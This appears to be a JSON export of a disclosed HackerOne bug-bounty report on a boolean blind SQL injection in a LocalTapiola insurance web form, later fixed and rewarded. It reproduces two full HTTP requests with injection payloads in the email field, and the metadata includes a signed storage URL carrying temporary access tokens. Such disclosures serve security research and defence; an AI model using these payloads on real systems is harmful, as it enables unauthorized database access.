@@ -1,0 +1,150 @@
+{
+  "id": 191146,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTExNDY=",
+  "url": "https://hackerone.com/reports/191146",
+  "title": "SQL Injection in lapsuudenturva (viestinta.lahitapiola.fi)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2016-12-14T14:37:51.895Z",
+  "submitted_at": "2016-12-14T14:37:51.895Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "sandh0t",
+    "url": "/sandh0t",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/006/299/944129af89e7f714b860d3bf18fdb3500424b999_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8416,
+    "url": "https://hackerone.com/localtapiola",
+    "handle": "localtapiola",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "LocalTapiola",
+      "twitter_handle": "",
+      "website": "http://www.lahitapiola.fi",
+      "about": "LocalTapiola’s products and services cover non-life, life and pension insurance, as well as investment and saving services."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2017-01-25T00:21:10.545Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2016-12-26T00:21:01.521Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Basic report information\n**Summary:**\n\nHi,\nThe  **ctx[vars][email]** parameter in **http://viestinta.lahitapiola.fi/webApp/lapsuudenturva**, can be exploited to perform an SQL Injection Attack.\n\nThe parameter is **ctx[vars][email]**\n\n**Description:**\n\nThe value inside the ctx tag <email></email>, doesn't properly sanitized to user input, it can be exploited to perform a **Boolean Blind SQL Injection**  Attack.\n\nYou can differentiate a response with a **True** SQL Statement and **False** one, by the looking of this string **\"Adform Tracking Code BEGIN\"**.\n\nA **True** SQL Statement will contain the **\"Adform Tracking Code BEGIN\"** strings, while  a **False** one will not.\n\n**Domain:** \nviestinta.lahitapiola.fi\n\n## Browsers / Apps Verified In:\n\n  All Browsers\n\n## Steps To Reproduce:\n\n  1. For a True response use this payload: **' and substr(version(),1,10) = 'PostgreSQL' and '1**\n\n```\n\nPOST /webApp/lapsuudenturva HTTP/1.1\nHost: viestinta.lahitapiola.fi\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nReferer: http://viestinta.lahitapiola.fi/webApp/lapsuudenturva\nCookie: _ga=GA1.3.2035133005.1481717157; _ga=GA1.2.2035133005.1481717157; vlmref=128248795816721230; _gat=1\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 1215\n\ninterest-lapsen-vakavan-sairauden-vakuutus=1&etunimi=aaaa&sukunimi=zzzz&puhelinnumero=00236556566&sahkoposti=hman%40opmail.com&postinumero=00125&postitoimipaikka=aaaa&ctx=<ctx lang=\"en\" _target=\"web\" webApp-id=\"48590459\" _folderModel=\"nmsRecipient\"><userInfo datakitInDatabase=\"true\" homeDir=\"\" instanceLocale=\"en-US\" locale=\"en-US\" login=\"webapp\" loginCS=\"Web applications agent (webapp)\" loginId=\"3290\" noConsoleCnx=\"true\" orgUnitId=\"0\" theme=\"\" timezone=\"Europe/Helsinki\" xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns=\"urn:xtk:session\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><login-right right=\"admin\"/></userInfo><timezone current=\"Europe/Helsinki\" changed=\"false\"/><vars><savings>0</savings><accident>0</accident><child>0</child><seriousIllness>1</seriousIllness><contacted>0</contacted><firstName>aaaa</firstName><lastName>zzzz</lastName><mobilePhone>00236556566</mobilePhone><email>hman@opmail.com' and substr(version(),1,10) = 'PostgreSQL' and '1</email><postalCode>00125</postalCode><city>aaaa</city></vars><activityHistory><activity name=\"page2\"/><activity name=\"start\"/></activityHistory></ctx>&userAction=next&transition=\n``` \n  2.  For a False response use this payload as example: ' and substr(version(),1,11) = 'PostgreSQL' and '1\n\n```\n\nPOST /webApp/lapsuudenturva HTTP/1.1\nHost: viestinta.lahitapiola.fi\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nReferer: http://viestinta.lahitapiola.fi/webApp/lapsuudenturva\nCookie: _ga=GA1.3.2035133005.1481717157; _ga=GA1.2.2035133005.1481717157; vlmref=128248795816721230; _gat=1\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 1215\n\ninterest-lapsen-vakavan-sairauden-vakuutus=1&etunimi=aaaa&sukunimi=zzzz&puhelinnumero=00236556566&sahkoposti=hman%40opmail.com&postinumero=00125&postitoimipaikka=aaaa&ctx=<ctx lang=\"en\" _target=\"web\" webApp-id=\"48590459\" _folderModel=\"nmsRecipient\"><userInfo datakitInDatabase=\"true\" homeDir=\"\" instanceLocale=\"en-US\" locale=\"en-US\" login=\"webapp\" loginCS=\"Web applications agent (webapp)\" loginId=\"3290\" noConsoleCnx=\"true\" orgUnitId=\"0\" theme=\"\" timezone=\"Europe/Helsinki\" xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns=\"urn:xtk:session\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><login-right right=\"admin\"/></userInfo><timezone current=\"Europe/Helsinki\" changed=\"false\"/><vars><savings>0</savings><accident>0</accident><child>0</child><seriousIllness>1</seriousIllness><contacted>0</contacted><firstName>aaaa</firstName><lastName>zzzz</lastName><mobilePhone>00236556566</mobilePhone><email>hman@opmail.com' and substr(version(),1,11) = 'PostgreSQL' and '1</email><postalCode>00125</postalCode><city>aaaa</city></vars><activityHistory><activity name=\"page2\"/><activity name=\"start\"/></activityHistory></ctx>&userAction=next&transition=\n\n```\n\n\n## Additional material\n\n  See Attached POC\n\n## Related reports, best practices\n\n  * [OWASP-recommendations]\n",
+  "bounty_amount": "1350.0",
+  "formatted_bounty": "$1,350",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 143498,
+      "file_name": "sqli_1.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/143/498/7e32d543e5f0d26626e01e88b40de590d99f9b0b/sqli_1.PNG?response-content-disposition=attachment%3B%20filename%3D%22sqli_1.PNG%22%3B%20filename%2A%3DUTF-8%27%27sqli_1.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ILJLE6S%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T122957Z&X-Amz-Expires=1605&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDJPm2BocKwYVHq6OvXN7Sjam7eo%2BSIxzA09VW0AVbp2gIhAJSEEdx%2Bwdp3lk64VEqNkIYIhXx%2FxKFpBdSyuvKn3uDQKrIFCHAQAxoMMDEzNjE5Mjc0ODQ5IgwDahPqWWM9RqpHhfIqjwWks8v1jlby6TsImaMYsudHHbH1Wx6QSFFy8DYbsq4sdNBOEyl9ATKaXjCK28W3pUZj7TyOZVii2jhReFgA81tdYD5PFfaf5uIAxYqN97CUjE9tYuC42DG8AfHfqoUrQSIYfsELneF%2FrwPpYOjej6pbEuJZgC5M%2FMSNXxJ9AkJT8ulcJ7ug2u26Vej6laJdmacOPyHhTSDRKqZ8bmU2qZkHjpllBjac8S0jwAJ%2FXOU29NjYq0HDmzg%2FtCQVuok6OwzgDb5hbqWacuN1sxtQGmO9mkyNT4Jw9z%2F%2FM2jKe5Ofp7a%2BsW7M29sPZWBmYpMpm8g2vSNBkxTCySmUy56WR33dkSWPoBYsFBFRxV0i7fuZNan6wwqSXVqlsDGcF4MC3juEMfOmDXorpSY3GLJ%2FVwB%2Fj80Xv6a%2Bp7E%2Bz60vHuZPKRdWwdUIM1%2FbZuj9lLL0UDjQ8xpD%2Bn0FK1fiDxHk1SpOsDjzEP1WahBgmwofMy3D1wpHA5KqDWaKaVFS70XROakujpAfdyfQE5PP6LUnATbGHMnn1bUwhuc0l2VVsshmhKcQ3B5C%2Br3sjG3Hmc9awv6w5zgQBLzR5VleYsLEogGPGtoOncfnHncG8bFUQeNJ22mQ5IuXzbJgMrGIr0P2mvs9lAWFZg6lDLV4JH5vHDviIh7FgcYJUEIkC%2FASSSfJ4S%2F1zmeydCzaoMWM1qaEMyyUrSw34Rs%2FNYdwqtXkMGgT8i40ddZ1ExgLoiuYapUfOH5SmgiRbbREJwXv%2FHCtjdpSUHP9m9syQLajUPFrc65NAq0WB5qVPRHnYKkJmfEG1uUTPQG95vZJq9AQRivJGj4HDlBYWgll%2B9E5Nd9B68J7QKUpyIIN7ophw%2FbOBQN8MMaXrK4GOrABPy7xOWyZjlcC8oDrt3gIH%2BpFpbBCNRA1BmLMfIgaiBMP5w4F8eLFwLZvlKhnztuddGA6O4Uh8OLKOQ2aMk5lW1Xis4FfdDyGJM6fgZBIafAGSXYrAN8T%2FOBBirnmKH3TipDF3gxk1HBgavZXNceHqfYGjmJlFOMF6p%2B60lxNvCERqm7z1BwOfKyvtKJeK4bvct0t59UMTMS%2FtySInE4heSVeslW4qBd%2FQRC4aXxUgJY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c55b9aadb70e940ebd30ae83a77c7c3944948eba9e9623f1f2c979e4737381f3",
+      "file_size": 114938,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-01-25T00:21:01.569Z",
+  "allow_singular_disclosure_after": -222523736.1959542,
+  "singular_disclosure_allowed": true,
+  "vote_count": 19,
+  "voters": [
+    "aromaa",
+    "cxzer0",
+    "mashoud1122",
+    "bogdantcaciuc",
+    "suv",
+    "sandh0t",
+    "yassineaboukir",
+    "madrobot",
+    "mpz",
+    "eveeez",
+    "and 9 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "id": 3145,
+      "category": "team",
+      "content": "##Issue\n\nThe reporter found a response based SQL Injection attack in an application in viestinta.lahitapiola.fi.\n\n##Fix\n\nThe issue was investigated and found to be valid. The fix was to sanitize the parameters in the application.\n\n##Reasoning\n\nThe reported case was valid and within the scope of the bug bounty program. The issue was fixed and the reporter was awarded with a bounty. ",
+      "user": {
+        "id": 60017,
+        "username": "localtapiola-thomas",
+        "name": "localtapiola-thomas",
+        "bio": "LocalTapiola Bug Bounty Coordinator - @tsmalmbe",
+        "cleared": false,
+        "verified": false,
+        "website": "http://www.lahitapiola.fi",
+        "location": "Espoo, Finland",
+        "created_at": "2016-03-09T13:58:17.117Z",
+        "url": "https://hackerone.com/localtapiola-thomas",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
